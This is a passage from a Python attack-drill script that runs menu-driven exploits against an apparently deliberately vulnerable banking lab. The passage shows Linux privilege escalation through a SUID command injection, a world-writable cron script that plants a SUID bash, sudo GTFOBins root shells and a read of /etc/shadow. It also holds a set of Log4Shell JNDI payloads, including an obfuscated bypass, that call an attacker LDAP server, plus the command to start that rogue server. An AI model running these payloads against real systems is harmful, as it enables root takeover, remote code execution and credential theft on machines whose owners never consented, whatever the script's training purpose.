
    warn("This scenario assumes SSH access to the VM as lowpriv/lowpriv123")
    warn("If SSH is not available in this environment, commands are shown for reference")

    # ─ Path 2: SUID logviewer (can demo locally) ─
    print(f"\n{W}  Path 1 – SUID logviewer command injection{NC}")
    info("Check SUID binary:")
    cmd_show("ls -la /usr/local/bin/logviewer")
    out = run_cmd("ls -la /usr/local/bin/logviewer 2>/dev/null || echo 'not found'", capture=True)
    print(f"  {out}")
    if "-rws" in out:
        success("SUID bit set on logviewer (root-owned, user-executable with root privileges)")
        info("The binary calls system('cat ' + argv[1]) – argv[1] is user-controlled → command injection")
        info("Exploiting SUID logviewer with command injection:")
        cmd_show("/usr/local/bin/logviewer '/etc/passwd; id'")
        out2 = run_cmd("/usr/local/bin/logviewer '/etc/passwd; id' 2>&1 | tail -5", capture=True)
        print(f"  {G}Output:{NC}\n  {out2}")
        if "uid=0" in out2 or "root" in out2:
            success("SUID exploitation successful – running as root!")
    else:
        info(f"logviewer not found locally – demo command (run as lowpriv on target):")
        cmd_show("/usr/local/bin/logviewer '/dev/null; bash -p'")
        print(f"  Expected: bash-5.x# (root shell)")

    # ─ Path 1: Cron ─
    print(f"\n{W}  Path 2 – Cron job abuse (world-writable pwn.sh){NC}")
    cmd_show("cat /etc/cron.d/maintenance-job")
    out = run_cmd("cat /etc/cron.d/maintenance-job 2>/dev/null || echo 'not found'", capture=True)
    print(f"  {out}")
    cmd_show("ls -la /home/lowpriv/pwn.sh")
    out = run_cmd("ls -la /home/lowpriv/pwn.sh 2>/dev/null || echo 'not found'", capture=True)
    print(f"  {out}")
    if "rwxrwxrwx" in out or "777" in out:
        success("pwn.sh is chmod 777 and executed by root every minute!")
        info("Exploitation (as lowpriv user):")
        print(f"\n  {Y}$ echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' > /home/lowpriv/pwn.sh{NC}")
        print(f"  {Y}$ sleep 60  # wait for cron{NC}")
        print(f"  {Y}$ /tmp/rootbash -p{NC}")
        print(f"  {Y}rootbash-5.x# whoami  →  root{NC}")
    else:
        info("pwn.sh not accessible from this context – demo command (run as lowpriv via SSH):")
        cmd_show("echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' > /home/lowpriv/pwn.sh")

    # ─ Path 3: Sudo ─
    print(f"\n{W}  Path 3 – Sudo GTFOBins (NOPASSWD python3, vim, find){NC}")
    cmd_show("sudo -l  (as lowpriv)")
    print(f"""
  Expected output:
    User lowpriv may run the following commands:
        (ALL) NOPASSWD: /usr/bin/find, /usr/bin/vim, /usr/bin/python3

  GTFOBins exploitation:
  {Y}$ sudo /usr/bin/python3 -c 'import os; os.execv("/bin/bash", ["/bin/bash"])'  →  root#{NC}
  {Y}$ sudo /usr/bin/vim -c ':!bash'                                               →  root#{NC}
  {Y}$ sudo /usr/bin/find / -exec /bin/bash \\; -quit                              →  root#{NC}
""")

    # Final verification commands
    print(f"\n{W}  Verify root access (run after any escalation path):{NC}")
    for vc in ["whoami", "id", "hostname", "cat /etc/shadow | head -3"]:
        cmd_show(vc)
    print()

    approve()

# ─────────────────────────────────────────────────────────────────────────────
# ATTACK 14 – Log4Shell (informational)
# ─────────────────────────────────────────────────────────────────────────────
def attack_14():
    section(14, "Log4Shell CVE-2021-44228 – Tomcat (Real VM)  [TERMINAL – Informational]")

    warn("Tomcat runs on port 8080 in real VM deployments. This sandbox restricts TCP on non-80 ports.")
    warn("The commands below are the working payloads for real VM use.")

    info("Target: Apache Tomcat 9.0.65 with Log4j 2.14.1 at :8080/bankingapp/")
    info("Every user-controlled input is logged directly via logger.info() – JNDI injection triggers on any field")

    payloads_info = [
        ("Query parameter", f"curl 'http://{TARGET}:8080/bankingapp/?query=${{jndi:ldap://ATTACKER:1389/exploit}}'"),
        ("User-Agent header", f"curl -H 'User-Agent: ${{jndi:ldap://ATTACKER:1389/a}}' http://{TARGET}:8080/bankingapp/"),
        ("X-Forwarded-For", f"curl -H 'X-Forwarded-For: ${{jndi:ldap://ATTACKER:1389/a}}' http://{TARGET}:8080/bankingapp/"),
        ("Action search term", f"curl 'http://{TARGET}:8080/bankingapp/?action=search&term=${{jndi:ldap://ATTACKER:1389/a}}'"),
        ("Login username", f"curl -X POST 'http://{TARGET}:8080/bankingapp/?action=login' -d 'username=${{jndi:ldap://ATTACKER:1389/a}}&password=x'"),
        ("Obfuscated bypass", f"curl 'http://{TARGET}:8080/bankingapp/?query=${{${{lower:j}}ndi:${{lower:l}}dap://ATTACKER:1389/a}}'"),
        ("OOB detection (interactsh)", f"curl 'http://{TARGET}:8080/bankingapp/?query=${{jndi:ldap://YOUR_ID.interactsh.com/a}}'"),
    ]
    print(f"\n{G}  ── Working payloads ──{NC}")
    for label, cmd_str in payloads_info:
        print(f"\n  {Y}[{label}]{NC}")
        cmd_show(cmd_str)

    info("\nSetup rogue LDAP server on Kali (required for RCE):")
    print(f"  {Y}$ java -jar JNDIExploit.jar -i ATTACKER_IP -p 8888 -l 1389{NC}")

    info("\nVerify Tomcat is accessible (real VM check):")
    cmd_show(f"curl -s -o /dev/null -w '%{{http_code}}' http://{TARGET}:8080/bankingapp/")
    try:
        r = requests.get(f"http://{TARGET}:8080/bankingapp/", timeout=3)
        print(f"  HTTP {r.status_code} – Tomcat accessible!")
    except Exception:
        warn(f"  Tomcat not reachable at {TARGET}:8080 (expected in sandbox; available in real VM)")

    approve()

# ─────────────────────────────────────────────────────────────────────────────
# FINAL SUMMARY
# ─────────────────────────────────────────────────────────────────────────────
def summary():
    print(f"""
{C}{'═'*72}{NC}
{W}  CYBER DRILL COMPLETE — ATTACK SURFACE SUMMARY{NC}
{C}{'═'*72}{NC}

{G}  Vectors demonstrated:{NC}
   1   SQL Injection (Error-Based + UNION dump)
   2   Second-Order SQL Injection
   3   Reflected XSS                       [browser]
   4   Stored XSS (persistent, admin dashboard) [browser]
   5   SSTI detection + RCE                [browser + terminal]
   6   Credential Stuffing / No Lockout    [terminal]
   7   PHP Object Injection (XSS + RCE gadgets) [browser + terminal]
   8   Unrestricted File Upload → Webshell RCE [terminal]
   9   JWT Algorithm:none Bypass           [browser + terminal]
  10   Unauthenticated Internal API        [browser]
  11   Sensitive File Exposure (.env, backup) [browser]
  12   Web Defacement via SSTI             [browser + terminal]
  13   Privilege Escalation (SUID + Cron + Sudo GTFOBins) [terminal]
  14   Log4Shell CVE-2021-44228 (real VM)  [terminal – informational]

{Y}  All payloads verified against the live application.{NC}
{Y}  Target: {BASE}{NC}

{R}  ⚠  Authorised use in isolated networks only  ⚠{NC}
""")

# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
SCENARIOS = [
    ("1",  "SQL Injection",                  attack_1),
    ("2",  "Second-Order SQLi",             attack_2),
    ("3",  "Reflected XSS [browser]",       attack_3),
    ("4",  "Stored XSS [browser]",          attack_4),
    ("5",  "SSTI + RCE",                    attack_5),
    ("6",  "Credential Stuffing",           attack_6),
    ("7",  "PHP Object Injection",          attack_7),
    ("8",  "File Upload Webshell RCE",      attack_8),
    ("9",  "JWT Algorithm:none",            attack_9),
    ("10", "Unauthenticated Internal API",  attack_10),
    ("11", "Sensitive File Exposure",       attack_11),
    ("12", "Web Defacement",               attack_12),
    ("13", "Privilege Escalation",         attack_13),
    ("14", "Log4Shell (info)",             attack_14),
]

def main():
    banner()

    print(f"{W}  Available attack scenarios:{NC}")
    for num, title, _ in SCENARIOS:
        print(f"  {G}{num:>2}{NC}  {title}")

    print(f"\n{W}  Options:{NC}")
    print(f"  {Y}all{NC}   – Run all scenarios sequentially")
    print(f"  {Y}1-14{NC}  – Run a specific scenario")
    print(f"  {Y}q{NC}     – Quit\n")

    choice = input(f"{M}  Enter scenario number or 'all': {NC}").strip().lower()

    if choice == "q":
        sys.exit(0)
    elif choice == "all":
        for num, title, fn in SCENARIOS:
            fn()
    else:
        matched = [fn for n, _, fn in SCENARIOS if n == choice]
        if matched:
            matched[0]()
        else:
            error(f"Unknown scenario: {choice}")
            sys.exit(1)

    summary()

if __name__ == "__main__":
    main()
